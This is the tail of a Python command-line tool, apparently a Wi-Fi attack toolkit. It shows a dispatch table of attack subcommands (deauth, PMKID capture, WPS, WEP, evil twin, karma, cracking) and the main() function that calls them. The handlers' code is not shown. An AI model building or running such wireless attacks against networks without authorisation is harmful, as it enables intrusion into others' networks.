    "deauth":    cmd_deauth,
    "capture":   cmd_capture,
    "pmkid":     cmd_pmkid,
    "wps":       cmd_wps,
    "evil-twin": cmd_eviltwin,
    "crack":     cmd_crack,
    "wep":       cmd_wep,
    "clients":   cmd_clients,
    "karma":     cmd_karma,
    "handshake": cmd_handshake,
    "info":      cmd_info,
}

def main():
    parser = build_parser()
    args = parser.parse_args()
    # propagate shared flags to args namespace
    if not hasattr(args, "no_banner"):
        args.no_banner = False
    if not hasattr(args, "verbose"):
        args.verbose = False
    if not hasattr(args, "output"):
        args.output = None

    fn = COMMANDS.get(args.command)
    if fn:
        fn(args)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
